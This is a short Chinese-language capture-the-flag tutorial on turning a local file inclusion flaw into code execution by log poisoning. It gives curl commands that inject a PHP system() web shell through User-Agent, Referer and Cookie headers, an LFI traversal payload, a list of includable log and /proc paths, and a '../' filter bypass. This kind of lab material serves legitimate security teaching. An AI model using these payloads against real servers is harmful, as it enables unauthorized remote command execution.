# LFI + 日志投毒

## 概述

当 RFI 不可用时，可以通过 LFI + 日志投毒（Log Poisoning）实现代码执行。

## 原理

1. 向服务器发送包含 PHP 代码的请求
2. PHP 代码被写入日志文件
3. 通过 LFI 包含日志文件
4. PHP 代码被执行

## 攻击步骤

### 1. 投毒 User-Agent

使用 curl 发送包含 PHP 代码的请求：

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
```

PHP 代码被记录到 Apache access.log 中。

### 2. 包含日志文件

```
?page=../../../var/log/apache2/access.log&cmd=cat /flag
```

### 3. 其他投毒点

- **Referer 头**：`curl -e "<?php system('id'); ?>" http://target.com/`
- **Cookie**：`curl -b "PHPSESSID=<?php system('id'); ?>" http://target.com/`
- **HTTP 头**：任何会被记录到日志的 HTTP 头

## 日志文件路径

```
/var/log/apache2/access.log    # Apache
/var/log/httpd/access_log      # CentOS Apache
/var/log/nginx/access.log      # Nginx
/var/log/auth.log              # SSH 认证日志
/var/log/syslog                # 系统日志
/proc/self/environ             # 环境变量（包含 HTTP 头）
/proc/self/fd/[0-20]          # 文件描述符
```

## 绕过过滤

### 过滤 ../

```
....//....//....//var/log/apache2/access.log
```

### 过滤关键字

使用编码或变量拼接。

## 练习步骤

1. 确认 LFI 存在
2. 尝试 RFI — 被禁用
3. 投毒 User-Agent
4. 包含日志文件
5. 执行命令获取 flag

## flag

在 `/flag` 文件中查找 `CR{...}` 格式的 flag。
